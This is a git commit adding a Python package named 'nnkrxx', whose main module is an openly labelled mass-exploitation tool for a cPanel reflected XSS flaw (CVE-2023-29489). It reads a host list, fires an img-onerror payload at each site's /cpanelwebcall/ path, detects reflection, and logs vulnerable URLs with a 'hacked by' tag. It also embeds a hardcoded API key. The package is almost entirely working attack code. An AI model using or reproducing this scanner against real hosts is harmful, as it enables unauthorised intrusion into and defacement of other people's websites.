4bbda254b3da6294068b8989e1adbc02c4afa1a2
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-01-26 05:03:32 +0000

    Add package nnkrxx/0.1/nnkrxx-0.1.tar.gz

---
+++ packages/nnkrxx/nnkrxx-0.1.tar.gz/nnkrxx-0.1/nnkrxx/main.py
@@ -0,0 +1,85 @@
+import shodan
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+import os
+import platform
+import pystyle
+from pystyle import *
+import webbrowser
+import socket
+
+TM = 'P0l3Hagw156AFK9Mk8e3hA6xEsiLFqXf'
+def main():
+
+    if platform.system() == 'Windows':
+        os.system(f'title Exploit XSS CVE-2023-29489')
+
+    not_exploit = 0
+    exploit = 0
+    error_connect = 0
+
+    def search_cpanel_hosts(api_key):
+        hosts = Write.Input("\r\n\nEnter the url list file : ", Colors.green)
+        print("\r")
+        file_site = open(hosts,'r').read().splitlines()
+        for host in file_site:
+            host = host.replace("https://","").replace("http://","").replace("/","")
+            if host:
+                yield host
+
+    def test_xss(url):
+        payload = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1111)">hacked%20by%20mr%20nnk"""
+        xss_url = urljoin(url, payload)
+        response = requests.get(xss_url, verify=False)
+        
+        soup = BeautifulSoup(response.text, 'html.parser')
+        img_tags = soup.find_all('img', src='x')
+        
+        for img_tag in img_tags:
+            if 'onerror' in img_tag.attrs and img_tag['onerror'] == "prompt(1111)":
+                return True, xss_url
+        return False, None
+
+
+    redirect_url = Write.Input("\r\n\nEnter the redirection link :  ", Colors.green)
+    for host in search_cpanel_hosts(TM):
+        for protocol in ['http', 'https']:
+            url = f'{protocol}://{host}'
+            ip = socket.gethostbyname(host)
+            
+            try:
+                is_exploit, xss_url = test_xss(url)
+                if is_exploit:
+                    print(f'\033[35m[+]\033[32m Exploit XSS >>>\033[37m {url} ~ {ip}')
+                    exploit +=  1
+                    if platform.system() == 'Windows':
+                        os.system(
+                            f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By nnk'
+                        ) 
+                    
+                    webbrowser.open(redirect_url)
+                    
+                    payload  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1915)">hacked%20by%20mr%20nnk"""
+                    xss_file = open("xss_file.txt", "a")
+                    xss_file.write(f"{url}{payload}\n")
+                    xss_file.close()
+                else: 
+                    print(f'\033[35m[+]\033[31m Not Exploit >>>\033[37m {url} ~ {ip}')
+                    not_exploit += 1
+                    if platform.system() == 'Windows':
+                        os.system(
+                            f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By nnk'
+                        ) 
+            except Exception as e:
+                print(f'\033[31m[!] Error Exploit >>> {url} ~ {ip} !!')
+                error_connect += 1
+                if platform.system() == 'Windows':
+                    os.system(
+                        f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By nnk'
+                    )
+
+if __name__ == '__main__':
+    main()
+
+print("\n\n\t\t By NNK\t\n")
---
+++ packages/nnkrxx/nnkrxx-0.1.tar.gz/nnkrxx-0.1/setup.py
@@ -0,0 +1,25 @@
+from setuptools import setup, find_packages
+
+with open("README.md", "r", encoding="utf-8") as fh:
+    long_description = fh.read()
+setup(
+    name='nnkrxx',
+    version='0.1',
+    author='R. NAVEEN NITHYA KALYAN',
+    author_email='naveennithyakalyan@gmail.com',
+    long_description=long_description,
+    long_description_content_type="text/markdown",
+    packages=find_packages(),
+     entry_points={
+        'console_scripts': [
+            'nnkrxx = nnkrxx.main:main',
+        ],
+     },
+     classifiers=[
+    
+    "License :: OSI Approved :: MIT License",
+    
+],
+
+    
+)
